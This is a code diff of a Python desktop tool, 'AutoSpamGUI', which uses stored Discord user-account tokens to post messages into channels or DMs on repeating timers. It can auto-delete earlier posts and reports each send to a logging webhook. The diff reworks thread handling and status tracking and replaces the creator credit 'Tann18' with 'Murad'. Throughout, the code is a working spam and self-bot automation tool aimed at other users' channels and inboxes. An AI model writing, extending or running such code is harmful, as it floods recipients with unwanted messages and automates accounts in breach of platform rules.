+            for channel_id, configs in channel_configs.items():
+                for config in configs:
+                    token_name = config.get("token_name", "")
+                    if not token_name:
+                        continue
+                    
+                    spam_identifier = f"{channel_id}_{self.config['tokens'][token_name][:8]}"
+                    status_info = self.channel_status.get(spam_identifier, {
+                        'status': 'Stopped',
+                        'message_count': 0,
+                        'start_time': None,
+                        'last_message_time': None
+                    })
+    
+                    running_time = "--"
+                    if status_info.get('start_time'):
+                        if status_info['status'] == 'Running':
+                            running_time = self.format_time_difference(time.time() - status_info['start_time'])
+                        elif status_info.get('stop_time'):
+                            running_time = self.format_time_difference(status_info['stop_time'] - status_info['start_time'])
+    
+                    last_message = "--"
+                    if status_info.get('last_message_time'):
+                        last_message = self.format_time_difference(time.time() - status_info['last_message_time'])
+    
+                    channel_name = config.get("channel_name", "")
+                    display_name = f"{channel_name} - " if channel_name else ""
+    
+                    self.status_tree.insert("", "end", text=channel_id, values=(
+                        display_name + channel_id,
+                        token_name,
+                        status_info['status'],
+                        running_time,
+                        str(status_info['message_count']),
+                        last_message,
+                        "Stop" if status_info['status'] == 'Running' else "Start"
+                    ))
     
     def update_token_listbox(self):
         try:
@@ -1177,9 +607,9 @@ class AutoSpamGUI:
                 {"name": "🔔 Status", "value": "Test message sent successfully", "inline": False},
                 {"name": "💬 Channel", "value": f"<#{webhook_channel_id}>", "inline": True},
                 {"name": "🕒 Time", "value": current_time, "inline": True},
-                {"name": "📝 Message", "value": "```This is a test message from Auto Spam by Tann18.```", "inline": False},
+                {"name": "📝 Message", "value": "```This is a test message from Auto Spam by Murad.```", "inline": False},
             ],
-            "footer": {"text": "Auto Post Message | Creator: Tann18"}
+            "footer": {"text": "Auto Post Message | Creator: Murad"}
         }
 
         payload = {
@@ -1446,28 +876,24 @@ class AutoSpamGUI:
             return
 
         channel = selected_channels[0]  # Edit only the first selected channel
-        original_channel_id = channel["channel_id"]  # Store original channel ID
 
         edit_window = tk.Toplevel(self.master)
         edit_window.title("Edit Channel Configuration")
         edit_window.geometry("400x650")
 
-        # Create a deep copy of the channel config to prevent shared references
-        channel_config = copy.deepcopy(channel)
-
         ttk.Label(edit_window, text="Channel ID:").pack(pady=5)
         channel_id_entry = ttk.Entry(edit_window, width=50)
-        channel_id_entry.insert(0, channel_config["channel_id"])
+        channel_id_entry.insert(0, channel["channel_id"])
         channel_id_entry.pack(pady=5)
 
         ttk.Label(edit_window, text="Channel Name:").pack(pady=5)
         channel_name_entry = ttk.Entry(edit_window, width=50)
-        channel_name_entry.insert(0, channel_config.get("channel_name", ""))
+        channel_name_entry.insert(0, channel.get("channel_name", ""))
         channel_name_entry.pack(pady=5)
 
         ttk.Label(edit_window, text="Message:").pack(pady=5)
         message_text = tk.Text(edit_window, height=5, width=50)
-        message_text.insert("1.0", channel_config["message"])
+        message_text.insert("1.0", channel["message"])
         message_text.pack(pady=5)
 
         ttk.Label(edit_window, text="Time Interval:").pack(pady=5)
@@ -1478,122 +904,88 @@ class AutoSpamGUI:
         for unit in ["weeks", "days", "hours", "minutes", "seconds"]:
             ttk.Label(time_frame, text=f"{unit.capitalize()}:").pack(side=tk.LEFT)
             entry = ttk.Entry(time_frame, width=5)
-            entry.insert(0, str(channel_config["time_config"].get(unit, "")))
+            entry.insert(0, str(channel["time_config"].get(unit, "")))
             entry.pack(side=tk.LEFT, padx=2)
             time_entries[unit] = entry
 
         ttk.Label(edit_window, text="Ping User ID:").pack(pady=5)
         ping_user_entry = ttk.Entry(edit_window, width=50)
-        ping_user_entry.insert(0, channel_config.get("ping_user", ""))
+        ping_user_entry.insert(0, channel.get("ping_user", ""))
         ping_user_entry.pack(pady=5)
 
-        is_dm_var = tk.BooleanVar(value=channel_config.get("is_dm", False))
+        is_dm_var = tk.BooleanVar(value=channel.get("is_dm", False))
         ttk.Checkbutton(edit_window, text="Send as DM", variable=is_dm_var).pack(pady=5)
 
-        auto_delete_var = tk.BooleanVar(value=channel_config.get("auto_delete", False))
+        auto_delete_var = tk.BooleanVar(value=channel.get("auto_delete", False))
         ttk.Checkbutton(edit_window, text="Auto Delete Previous Message", variable=auto_delete_var).pack(pady=5)
 
-        # Token selection with individual config
         ttk.Label(edit_window, text="Token:").pack(pady=5)
         token_combobox = ttk.Combobox(edit_window, values=list(self.config["tokens"].keys()))
-        current_token = channel_config.get("token_name", "")
-        token_combobox.set(current_token)
+        token_combobox.set(channel.get("token_name", ""))
         token_combobox.pack(pady=5)
 
         def save_changes():
-            try:
-                # Create new config for this specific channel
-                new_config = {
-                    "channel_id": channel_id_entry.get(),
-                    "channel_name": channel_name_entry.get(),
-                    "message": message_text.get("1.0", tk.END).strip(),
-                    "time_config": {unit: int(entry.get()) for unit, entry in time_entries.items() if entry.get()},
-                    "ping_user": ping_user_entry.get(),
-                    "is_dm": is_dm_var.get(),
-                    "auto_delete": auto_delete_var.get(),
-                    "token_name": token_combobox.get()
-                }
-
-                # Update only the specific channel in the configuration
-                updated = False
-                for i, ch in enumerate(self.config["channels"]):
-                    if ch["channel_id"] == original_channel_id:
-                        self.config["channels"][i] = new_config
-                        updated = True
-                        break
-
-                if not updated:
-                    messagebox.showerror("Error", "Failed to find original channel configuration")
-                    return
-
-                # Save the configuration
-                self.save_config()
-
-                # Update status for this specific channel
-                with self.channel_status_lock:
-                    for status_id in list(self.channel_status.keys()):
-                        if status_id.startswith(original_channel_id):
-                            # Update or remove status based on token change
-                            if status_id == f"{original_channel_id}_{new_config['token_name'][:8]}":
-                                self.channel_status[status_id].update({
-                                    'channel_id': new_config['channel_id'],
-                                    'token': new_config['token_name'][:8],
-                                    'time_config': new_config['time_config']
-                                })
-                            else:
-                                # Remove old status if token changed
-                                del self.channel_status[status_id]
-
-                # Stop existing thread if running
-                thread_key = f"{original_channel_id}"
-                if thread_key in self.channel_threads:
-                    self.stop_single_spam(original_channel_id)
-
+            new_config = {
+                "channel_id": channel_id_entry.get(),
+                "channel_name": channel_name_entry.get(),
+                "message": message_text.get("1.0", tk.END).strip(),
+                "time_config": {unit: int(entry.get()) for unit, entry in time_entries.items() if entry.get()},
+                "ping_user": ping_user_entry.get(),
+                "is_dm": is_dm_var.get(),
+                "auto_delete": auto_delete_var.get(),
+                "token_name": token_combobox.get()
+            }
+        
+            if self.update_channel(channel["channel_id"], new_config):
                 messagebox.showinfo("Success", "Channel configuration updated successfully")
-                self.update_status_display()
-                edit_window.destroy()
-
-            except Exception as e:
-                messagebox.showerror("Error", f"Failed to update channel configuration: {str(e)}")
-                logging.error(f"Error updating channel configuration: {str(e)}")
-
+                self.update_status_display()  # Refresh the status display
+            else:
+                messagebox.showerror("Error", "Failed to update channel configuration")
+            edit_window.destroy()
+    
+        # Add this line to create the Save Changes button
         ttk.Button(edit_window, text="Save Changes", command=save_changes).pack(pady=10)
+    
+        # If you want to add a cancel button as well, you can add this:
         ttk.Button(edit_window, text="Cancel", command=edit_window.destroy).pack(pady=5)
+        self.update_channel_status()
 
     def save_settings(self):
-        """Save all settings while maintaining individual channel configurations"""
-        try:
-            # Save webhook configurations
-            self.config["webhook_url"] = self.webhook_url_entry.get()
-            self.config["webhook_channel_id"] = self.webhook_channel_id_entry.get()
+        self.config["webhook_url"] = self.webhook_url_entry.get()
+        self.config["webhook_channel_id"] = self.webhook_channel_id_entry.get()
+        
+        # Save token configurations
+        for token_name in self.config["tokens"]:
+            token_value = self.config["tokens"][token_name]
+            self.config["tokens"][token_name] = token_value
 
-            # Save token configurations without affecting channels
-            for token_name in self.config["tokens"].copy():
-                token_value = self.config["tokens"][token_name]
-                self.config["tokens"][token_name] = token_value
+        # Save channel configurations
+        for channel in self.config["channels"]:
+            channel_id = channel["channel_id"]
+            channel_name = channel.get("channel_name", "")
+            message = channel["message"]
+            time_config = channel["time_config"]
+            is_dm = channel.get("is_dm", False)
+            ping_user = channel.get("ping_user", "")
+            auto_delete = channel.get("auto_delete", False)
+            token_name = channel.get("token_name", "")
 
-            # Save channel configurations individually
-            for channel in self.config["channels"]:
-                channel_id = channel["channel_id"]
-                # Create a deep copy to prevent shared references
-                channel_copy = copy.deepcopy(channel)
+            channel.update({
+                "channel_id": channel_id,
+                "channel_name": channel_name,
+                "message": message,
+                "time_config": time_config,
+                "is_dm": is_dm,
+                "ping_user": ping_user,
+                "auto_delete": auto_delete,
+                "token_name": token_name
+            })
 
-                # Update the channel while preserving its individual token configuration
-                for i, existing_channel in enumerate(self.config["channels"]):
-                    if existing_channel["channel_id"] == channel_id:
-                        self.config["channels"][i] = channel_copy
-                        break
-
-            self.save_config()
-            logging.info("Settings saved successfully")
-            logging.info(f"Number of tokens: {len(self.config['tokens'])}")
-            logging.info(f"Number of channels: {len(self.config['channels'])}")
-            messagebox.showinfo("Success", "Settings saved successfully")
-
-        except Exception as e:
-            error_msg = f"Error saving settings: {str(e)}"
-            logging.error(error_msg)
-            messagebox.showerror("Error", error_msg)
+        self.save_config()
+        logging.info(f"Settings saved. Webhook URL: {self.config['webhook_url']}")
+        logging.info(f"Number of tokens saved: {len(self.config['tokens'])}")
+        logging.info(f"Number of channels saved: {len(self.config['channels'])}")
+        messagebox.showinfo("Success", "Settings saved successfully")
 
     def start_single_spam(self, config):
         channel_id = config["channel_id"]
@@ -1606,10 +998,11 @@ class AutoSpamGUI:
 
         token = self.config["tokens"][token_name]
 
-        # Create a unique thread identifier that includes both channel and token
-        thread_key = f"{channel_id}_{token_name}"
+        if channel_id in self.channel_threads and self.channel_threads[channel_id].is_alive():
+            messagebox.showinfo("Info", f"Spam thread for channel {channel_id} is already running.")
+            logging.info(f"Attempted to start an already running spam thread for channel {channel_id}")
+            return
 
-        # Directly create and start the thread
         thread = threading.Thread(
             target=self.spam_loop,
             args=(
@@ -1619,36 +1012,25 @@ class AutoSpamGUI:
                 config["time_config"],
                 config.get("ping_user"),
                 config.get("auto_delete", False),
-                config.get("is_dm", False),
-                token_name
+                config.get("is_dm", False)
             )
         )
         thread.daemon = True
-        thread.stop_flag = False  # Add a stop flag to each thread
+        self.channel_threads[channel_id] = thread
 
         try:
-            # Remove any existing thread with this key
-            if thread_key in self.channel_threads:
-                old_thread = self.channel_threads[thread_key]
-                if old_thread.is_alive():
-                    old_thread.stop_flag = True
-                    old_thread.join(timeout=1)
-
-            # Store and start the new thread
-            self.channel_threads[thread_key] = thread
             thread.start()
 
             with self.channel_status_lock:
-                status_key = f"{channel_id}_{token_name}"
-                self.channel_status[status_key] = {
+                if channel_id not in self.channel_status:
+                    self.channel_status[channel_id] = {}
+                self.channel_status[channel_id].update({
                     "start_time": time.time(),
                     "status": "Running",
                     "message_count": 0,
                     "last_message_time": None,
-                    "time_config": config['time_config'],
-                    "token": token_name,
-                    "channel_id": channel_id
-                }
+                    "time_config": config['time_config']
+                })
 
             self.update_status_display()
 
@@ -1664,13 +1046,12 @@ class AutoSpamGUI:
             messagebox.showerror("Error", error_message)
             logging.error(error_message)
 
-            with self.channel_status_lock:
-                if thread_key in self.channel_threads:
-                    del self.channel_threads[thread_key]
+            if channel_id in self.channel_threads:
+                del self.channel_threads[channel_id]
 
-                status_key = f"{channel_id}_{token_name}"
-                if status_key in self.channel_status:
-                    self.channel_status[status_key]["status"] = "Failed to Start"
+            with self.channel_status_lock:
+                if channel_id in self.channel_status:
+                    self.channel_status[channel_id]["status"] = "Failed to Start"
 
             self.update_status_display()
 
@@ -1682,44 +1063,25 @@ class AutoSpamGUI:
                 return stop_time - start_time
         return 0
 
-    def stop_single_spam(self, status_key):
-        """Stop spam for a specific configuration identified by its unique status key"""
-        try:
-            # Split the status key to get channel_id and token_name
-            channel_id, token_name = status_key.split('_', 1)
+    def stop_single_spam(self, channel_id):
+        if channel_id in self.channel_threads:
+            # Set a flag in the thread to signal it to stop
+            self.channel_threads[channel_id].stop_flag = True
+            self.channel_threads[channel_id].join(timeout=5)  # Wait up to 5 seconds for the thread to finish
+            if self.channel_threads[channel_id].is_alive():
+                logging.warning(f"Thread for channel {channel_id} did not stop properly")
+            del self.channel_threads[channel_id]
 
-            with self.channel_status_lock:
-                # Ensure thread exists and is alive before stopping
-                if status_key in self.channel_threads:
-                    thread = self.channel_threads[status_key]
-                    if thread and thread.is_alive():
-                        thread.stop_flag = True  # Signal the thread to stop
-                        thread.join(timeout=2)  # Wait for thread to terminate
+        with self.channel_status_lock:
+            if channel_id in self.channel_status:
+                self.channel_status[channel_id]["status"] = "Stopped"
+                self.channel_status[channel_id]["stop_time"] = time.time()
 
-                    # Remove the thread from tracking
-                    del self.channel_threads[status_key]
+        self.update_status_display()
+        logging.info(f"Spam thread stopped for channel {channel_id}")
 
-                # Update the status for this specific configuration
-                if status_key in self.channel_status:
-                    self.channel_status[status_key]['status'] = 'Stopped'
-                    self.channel_status[status_key]['stop_time'] = time.time()
-
-            self.update_status_display()
-
-            logging.info(f"Stopped spam for channel {channel_id} with token {token_name}")
-            messagebox.showinfo("Stopped", f"Spam stopped for channel {channel_id}")
-
-        except Exception as e:
-            logging.error(f"Error stopping spam for {status_key}: {str(e)}")
-            messagebox.showerror("Error", f"Failed to stop spam: {str(e)}")
-
-    def get_specific_channel_config(self, channel_id, token_name):
-        """Find a specific channel configuration matching both channel_id and token_name"""
-        for channel in self.config["channels"]:
-            if (channel["channel_id"] == channel_id and 
-                channel.get("token_name") == token_name):
-                return channel
-        return None
+        # Show alert
+        messagebox.showinfo("Stopped", f"Spam thread for channel {channel_id} has been stopped")
 
     def load_initial_configurations(self):
         for channel_config in self.config["channels"]:
@@ -1746,140 +1108,89 @@ class AutoSpamGUI:
         self.update_status_display()
 
     def stop_spam_with_status(self):
-        """Stop all spam threads and update their status"""
-        # Set the global stop event
         self.stop_event.set()
+        for channel_id in list(self.channel_threads.keys()):
+            self.stop_single_spam(channel_id)
+        self.is_running = False
+        self.overall_status_label.config(text="Overall Status: Stopped")
+        messagebox.showinfo("Stopped", "All spam threads have been stopped")
+        logging.info("All spam threads stopped")
 
-        try:
-            # Get all running thread keys
-            thread_keys = list(self.channel_threads.keys())
-
-            # Stop each thread individually
-            for thread_key in thread_keys:
-                channel_id = thread_key.split('_')[0]
-                token_name = thread_key.split('_')[1]
-
-                # Get the thread object
-                thread = self.channel_threads.get(thread_key)
-                if thread and thread.is_alive():
-                    # Set thread-specific stop flag
-                    if hasattr(thread, 'stop_flag'):
-                        thread.stop_flag = True
-
-                    # Wait for thread to finish (with timeout)
-                    thread.join(timeout=2)
-
-                    # If thread is still alive after timeout, try to terminate it
-                    if thread.is_alive():
-                        logging.warning(f"Thread for channel {channel_id} with token {token_name} didn't stop gracefully")
-
-                    # Remove thread from tracking
-                    self.channel_threads.pop(thread_key, None)
-
-                # Update status for this channel-token combination
-                status_key = f"{channel_id}_{token_name}"
-                with self.channel_status_lock:
-                    if status_key in self.channel_status:
-                        self.channel_status[status_key].update({
-                            'status': 'Stopped',
-                            'stop_time': time.time()
-                        })
-
-            # Clear all thread references
-            self.channel_threads.clear()
-            self.is_running = False
-
-            # Update UI elements
-            if hasattr(self, 'overall_status_label'):
-                self.overall_status_label.config(text="Overall Status: Stopped")
-
-            self.update_status_display()
-            messagebox.showinfo("Stopped", "All spam threads have been stopped")
-            logging.info("All spam threads stopped successfully")
-
-        except Exception as e:
-            logging.error(f"Error in stop_spam_with_status: {str(e)}")
-            messagebox.showerror("Error", f"Error stopping spam threads: {str(e)}")
-
-    def spam_loop(self, channel_id, message, token, time_config, ping_user=None, auto_delete=False, is_dm=False, token_name=None):
-        """Modified spam loop with better stop handling"""
+    def spam_loop(self, channel_id, message, token, time_config, ping_user, auto_delete, is_dm):
         thread = threading.current_thread()
         thread.stop_flag = False
-        
-        headers = {
-            'authorization': token,
-            'content-type': 'application/json'
-        }
-    
-        status_key = f"{channel_id}_{token_name}"
-        
-        while not thread.stop_flag and not self.stop_event.is_set():
+
+        # Create a unique identifier for this spam instance
+        spam_identifier = f"{channel_id}_{token[:8]}"  # Use first 8 chars of token for ID
+        last_message_id = None
+
+        while not thread.stop_flag:
             try:
-                # Calculate delay
-                delay = self.calculate_delay(time_config)
-                
-                # Send message
-                if is_dm:
-                    url = f'https://discord.com/api/v9/users/@me/channels'
-                    dm_channel_payload = {'recipient_id': channel_id}
-                    
-                    dm_response = requests.post(url, headers=headers, json=dm_channel_payload, verify=self.cert_path)
-                    if dm_response.status_code == 200:
-                        dm_channel_id = dm_response.json()['id']
-                        url = f'https://discord.com/api/v9/channels/{dm_channel_id}/messages'
-                    else:
-                        raise Exception(f"Failed to create DM channel: {dm_response.status_code}")
-                else:
-                    url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
-    
-                payload = {'content': message}
-                response = requests.post(url, headers=headers, json=payload, verify=self.cert_path)
-                
-                success = response.status_code == 200
-                
-                # Update message count and last message time
+                # Send the message
+                success, result, new_message_id = self.send_discord_message(token, channel_id, message, 
+                    last_message_id if auto_delete else None, is_dm)
+
+                # Update channel status using the unique identifier
                 with self.channel_status_lock:
-                    if status_key in self.channel_status:
-                        self.channel_status[status_key]['message_count'] = self.channel_status[status_key].get('message_count', 0) + 1
-                        self.channel_status[status_key]['last_message_time'] = time.time()
-                
-                # Send webhook
+                    if spam_identifier not in self.channel_status:
+                        self.channel_status[spam_identifier] = {
+                            'channel_id': channel_id,
+                            'token': token[:8],  # Store partial token for identification
+                            'status': 'Running',
+                            'message_count': 0,
+                            'start_time': time.time(),
+                            'last_message_time': None,
+                            'last_error': None,
+                            'time_config': time_config
+                        }
+
+                    self.channel_status[spam_identifier]['last_attempt_time'] = time.time()
+
+                    if success:
+                        self.channel_status[spam_identifier]['message_count'] += 1
+                        self.channel_status[spam_identifier]['last_message_time'] = time.time()
+                        self.channel_status[spam_identifier]['last_message_id'] = new_message_id
+                        last_message_id = new_message_id
+                        logging.info(f"Success {'DM' if is_dm else 'channel'} {channel_id} with token ending in {token[-8:]}")
+                    else:
+                        self.channel_status[spam_identifier]['last_error'] = result
+                        logging.error(f"Failed to send message to {'DM' if is_dm else 'channel'} {channel_id} with token ending in {token[-8:]}: {result}")
+
+                if success:
+                    self.message_count += 1 
+
                 self.send_webhook(channel_id, message, success, time_config, ping_user, is_dm)
-                
-                # Auto delete if enabled
-                if success and auto_delete:
-                    message_id = response.json()['id']
-                    delete_url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}'
-                    requests.delete(delete_url, headers=headers, verify=self.cert_path)
-                
-                # Check stop conditions before sleep
-                if thread.stop_flag or self.stop_event.is_set():
+                self.update_status_display()  # Update display after each message
+
+                if thread.stop_flag:
                     break
-                    
-                # Sleep with periodic stop check
-                sleep_start = time.time()
-                while time.time() - sleep_start < delay:
-                    if thread.stop_flag or self.stop_event.is_set():
-                        return
-                    time.sleep(min(0.5, delay))  # Check every 0.5 seconds or less
-                    
+                
+                delay = self.calculate_delay(time_config)
+
+                start_time = time.time()
+                while time.time() - start_time < delay:
+                    if thread.stop_flag:
+                        break
+                    time.sleep(min(1, delay - (time.time() - start_time)))
+
             except Exception as e:
-                logging.error(f"Error in spam loop for channel {channel_id}: {str(e)}")
-                self.send_webhook(channel_id, message, False, time_config, ping_user, is_dm)
-                
-                # Check stop conditions before continuing
-                if thread.stop_flag or self.stop_event.is_set():
-                    break
-                    
-                time.sleep(5)  # Wait before retrying after error
-    
-        # Update status when loop ends
+                error_message = f"Error in spam loop for {spam_identifier}: {str(e)}"
+                logging.error(error_message)
+
+                with self.channel_status_lock:
+                    if spam_identifier in self.channel_status:
+                        self.channel_status[spam_identifier]['last_error'] = error_message
+
+                time.sleep(5)
+
+        # Thread is stopping
         with self.channel_status_lock:
-            if status_key in self.channel_status:
-                self.channel_status[status_key]['status'] = 'Stopped'
-                self.channel_status[status_key]['stop_time'] = time.time()
-        
+            if spam_identifier in self.channel_status:
+                self.channel_status[spam_identifier]['status'] = 'Stopped'
+
+        logging.info(f"Spam loop for {'DM' if is_dm else 'channel'} {channel_id} with token ending in {token[-8:]} stopped")
         self.update_status_display()
+
     
     def update_running_threads_display(self):
         if not hasattr(self, 'status_tree') or self.status_tree is None:
@@ -1935,92 +1246,57 @@ class AutoSpamGUI:
         return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
 
     def send_discord_message(self, token, channel_id, message, last_message_id=None, is_dm=False):
-        try:
+        if is_dm:
+            api_url = f"https://discord.com/api/v9/users/@me/channels"
+            dm_payload = {"recipient_id": channel_id}
             headers = {
                 'Authorization': token,
                 'Content-Type': 'application/json'
             }
+            try:
+                dm_response = requests.post(api_url, headers=headers, json=dm_payload, timeout=10, verify=self.cert_path)
+                dm_response.raise_for_status()
+                dm_channel = dm_response.json()
+                channel_id = dm_channel['id']
+            except requests.exceptions.RequestException as e:
+                error_message = f'Failed to create DM channel: {str(e)}'
+                logging.error(error_message)
+                return False, error_message, None
 
-            # Handle DM creation if needed
-            if is_dm:
-                api_url = f"https://discord.com/api/v9/users/@me/channels"
-                dm_payload = {"recipient_id": channel_id}
-
-                dm_response = requests.post(
-                    api_url, 
-                    headers=headers,
-                    json=dm_payload,
-                    timeout=10,
-                    verify=self.cert_path
-                )
-
-                if dm_response.status_code == 200:
-                    channel_id = dm_response.json()['id']
-                else:
-                    return False, f'Failed to create DM channel: {dm_response.text}', None
-
-            # Delete previous message if needed
+        api_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
+        headers = {
+            'Authorization': token,
+            'Content-Type': 'application/json'
+        }
+        payload = {
+            'content': message
+        }
+        try:
             if last_message_id and not is_dm:
-                try:
-                    delete_url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{last_message_id}"
-                    requests.delete(
-                        delete_url,
-                        headers=headers,
-                        timeout=10,
-                        verify=self.cert_path
-                    )
-                except Exception as e:
-                    logging.warning(f"Failed to delete previous message: {str(e)}")
-                    # Continue even if delete fails
+                delete_url = f"{api_url}/{last_message_id}"
+                delete_response = requests.delete(delete_url, headers=headers, timeout=10, verify=self.cert_path)
+                delete_response.raise_for_status()
+                logging.info(f"Successfully deleted previous message in {'DM' if is_dm else 'channel'} {channel_id}")
 
-            # Send new message
-            api_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
-            payload = {'content': message}
-
-            response = requests.post(
-                api_url,
-                headers=headers,
-                json=payload,
-                timeout=10,
-                verify=self.cert_path
-            )
-
-            if response.status_code == 200:
-                return True, 'Message sent successfully!', response.json().get('id')
-            else:
-                error_msg = f'Failed to send message: {response.status_code} - {response.text}'
-                return False, error_msg, None
-
+            response = requests.post(api_url, headers=headers, json=payload, timeout=10, verify=self.cert_path)
+            response.raise_for_status()
+            logging.info(f"Successfully sent message to {'DM' if is_dm else 'channel'} {channel_id}")
+            return True, f'Message sent successfully to {"DM" if is_dm else "channel"} <#{channel_id}>!', response.json().get('id')
         except requests.exceptions.RequestException as e:
-            error_msg = f'Request failed: {str(e)}'
-            logging.error(error_msg)
-            return False, error_msg, None
-        except Exception as e:
-            error_msg = f'Unexpected error: {str(e)}'
-            logging.error(error_msg)
-            return False, error_msg, None
+            error_message = f'Failed to send message to {"DM" if is_dm else "channel"} <#{channel_id}>: {str(e)}'
+            logging.error(error_message)
+            if hasattr(e, 'response'):
+                logging.error(f"Response status code: {e.response.status_code}")
+                logging.error(f"Response content: {e.response.text}")
+            return False, error_message, None
 
     def update_channel(self, channel_id, new_config):
-        """Update a specific channel configuration"""
-        updated = False
         for i, channel in enumerate(self.config["channels"]):
             if channel["channel_id"] == channel_id:
                 self.config["channels"][i] = new_config
-                updated = True
-                break
-            
-        if updated:
-            self.save_config()
-            # Update status only for this specific channel
-            with self.channel_status_lock:
-                status_key = f"{channel_id}_{new_config['token_name'][:8]}"
-                if status_key in self.channel_status:
-                    self.channel_status[status_key].update({
-                        'time_config': new_config['time_config'],
-                        'token': new_config['token_name'][:8]
-                    })
-    
-        return updated
+                self.save_config()
+                return True
+        return False
 
     def update_channel_status(self):
         with self.channel_status_lock:
@@ -2052,9 +1328,27 @@ class AutoSpamGUI:
         for channel_id in list(self.channel_threads.keys()):
             self.stop_single_spam(channel_id)
         self.is_running = False
-        self.overall_status_label.config(text="Overall Status: Stopped")
+
+        if hasattr(self, 'overall_status_label'):
+            self.overall_status_label.config(text="Overall Status: Stopped")
+
+        if hasattr(self, 'status_tree'):
+            for item in self.status_tree.get_children():
+                channel_id = self.status_tree.item(item)['text']
+                self.status_tree.item(item, values=(
+                    self.status_tree.item(item)['values'][0], 
+                    "Stopped",
+                    "--",  
+                    self.status_tree.item(item)['values'][3],  
+                    self.status_tree.item(item)['values'][4],  
+                    self.status_tree.item(item)['values'][5],  
+                    "Start"  
+                ))
+
+        self.update_status_display()
         messagebox.showinfo("Stopped", "All spam threads have been stopped")
         logging.info("All spam threads stopped")
+
 
     def format_time_config(self, time_config):
         formatted = []
@@ -2064,100 +1358,72 @@ class AutoSpamGUI:
         return " ".join(formatted) if formatted else "Instant"
 
     def calculate_delay(self, time_config):
-        """Calculate delay in seconds from time configuration"""
         total_seconds = 0
+        for unit, value in time_config.items():
+            if unit == 'weeks':
+                total_seconds += value * 7 * 24 * 3600
+            elif unit == 'days':
+                total_seconds += value * 24 * 3600
+            elif unit == 'hours':
+                total_seconds += value * 3600
+            elif unit == 'minutes':
+                total_seconds += value * 60
+            elif unit == 'seconds':
+                total_seconds += value
+        return max(total_seconds, 1)  # Ensure at least 1 second delay 
 
-        if 'weeks' in time_config:
-            total_seconds += time_config['weeks'] * 7 * 24 * 3600
-        if 'days' in time_config:
-            total_seconds += time_config['days'] * 24 * 3600
-        if 'hours' in time_config:
-            total_seconds += time_config['hours'] * 3600
-        if 'minutes' in time_config:
-            total_seconds += time_config['minutes'] * 60
-        if 'seconds' in time_config:
-            total_seconds += time_config['seconds']
-
-        # Ensure minimum delay of 1 second
-        return max(total_seconds, 1)
-
-    def send_webhook(self, channel_id, message, success, time_config, ping_user=None, is_dm=False, token_name=None):
+    def send_webhook(self, channel_id, message, success, time_config, ping_user=None, is_dm=False):
         webhook_url = self.config.get('webhook_url')
-    
+
         if not webhook_url:
             logging.warning("Webhook URL is not set. Skipping webhook send.")
             return
-    
+
         logging.info(f"Preparing to send webhook for {'DM' if is_dm else 'channel'} {channel_id}")
-    
+
         current_time = time.strftime("%I:%M:%S %p")
-    
-        # Safely handle None token_name
-        if token_name is None:
-            # Try to find a token associated with this channel
-            for channel in self.config.get("channels", []):
-                if channel.get("channel_id") == channel_id:
-                    token_name = channel.get("token_name")
-                    break
-                
-        # Fallback account name handling
-        account_name = "Unknown Account"
-        if token_name:
-            # Safely find the account name
-            for name, token in self.config.get("tokens", {}).items():
-                if name == token_name:
-                    account_name = name
-                    break
-    
-        # Use token-specific status key to get correct message count
-        status_key = f"{channel_id}_{token_name}"
-        message_count = 0
+
+        # Calculate running time based on channel status
         running_time_str = "00:00:00"
-        
         with self.channel_status_lock:
-            status = self.channel_status.get(status_key, {})
-            message_count = status.get('message_count', 0)
-            start_time = status.get('start_time')
-            if start_time and status.get('status') == 'Running':
-                running_time = datetime.now() - datetime.fromtimestamp(start_time)
-                hours, remainder = divmod(int(running_time.total_seconds()), 3600)
-                minutes, seconds = divmod(remainder, 60)
-                running_time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
-    
-        banner_url = "https://i.ibb.co.com/f1ZScNq/standard-2.gif"
-    
-        # Get the account name from token name
-        account_name = next((name for name, token in self.config["tokens"].items() 
-                            if name.startswith(token_name)), token_name)
-    
+            if channel_id in self.channel_status:
+                start_time = self.channel_status[channel_id].get('start_time')
+                if start_time:
+                    running_time = datetime.now() - datetime.fromtimestamp(start_time)
+                    hours, remainder = divmod(int(running_time.total_seconds()), 3600)
+                    minutes, seconds = divmod(remainder, 60)
+                    running_time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
+
+        banner_url = "https://i.ibb.co.com/f1ZScNq/standard-2.gif"  # Replace with actual banner image URL
+
         embed = {
             "title": " Auto Message Log ",
             "color": 0x9B59B6,
             "fields": [
                 {"name": "<a:seru:1204280141145186334> Status", "value": "<a:kk_gif_Online_Ping:1204283707251236904> Message sent successfully" if success else "<a:offline:1204283658895368264> Failed to send message", "inline": False},
                 {"name": "<:messenger:1268148703252971584> Channel", "value": f"<#{channel_id}>" if not is_dm else f"DM to <#{channel_id}>", "inline": True},
-                {"name": "<:user:1268148703252971584> Account", "value": account_name, "inline": True},  # Added account name field
                 {"name": "<a:crap5:1268148019740540928> Time", "value": current_time, "inline": True},
                 {"name": "<a:XYRASirine:1204282584503296040> Running Time", "value": running_time_str, "inline": True},
-                {"name": "<a:pin:1204280241653284904> Messages Sent", "value": str(message_count), "inline": True},
+                {"name": "<a:pin:1204280241653284904> Messages Sent", "value": str(self.get_message_count(channel_id)), "inline": True},
                 {"name": "<:clock:1268147985901158506> Interval", "value": self.format_time_config(time_config), "inline": True},
                 {"name": "<:birth:1268147985901158506> Message", "value": f"```{message[:1000]}```", "inline": False},
             ],
             "image": {"url": banner_url},
             "footer": {
-                "text": "Auto Post | Creator: Tann18"
+                "text": "Auto Post | Creator: Murad"
             }
         }
-    
+
         payload = {
             "embeds": [embed],
             "username": "Auto Message Log",
             "avatar_url": "https://i.ibb.co.com/FwddMLs/image.png"
         }
-    
+
+        # Add ping to payload if message failed and ping_user is provided
         if not success and ping_user:
             payload["content"] = f"<@{ping_user}> Message failed to send!"
-    
+
         try:
             response = requests.post(webhook_url, json=payload, timeout=10, verify=self.cert_path)
             response.raise_for_status()
@@ -2171,113 +1437,75 @@ class AutoSpamGUI:
                 logging.error("No response object available")
 
     def get_message_count(self, channel_id):
-        """Retrieve total message count for a specific channel"""
         with self.channel_status_lock:
-            channel_status = self.channel_status.get(channel_id, {})
-            return channel_status.get('message_count', 0)
+            if channel_id in self.channel_status:
+                return self.channel_status[channel_id].get('message_count', 0)
+        return 0
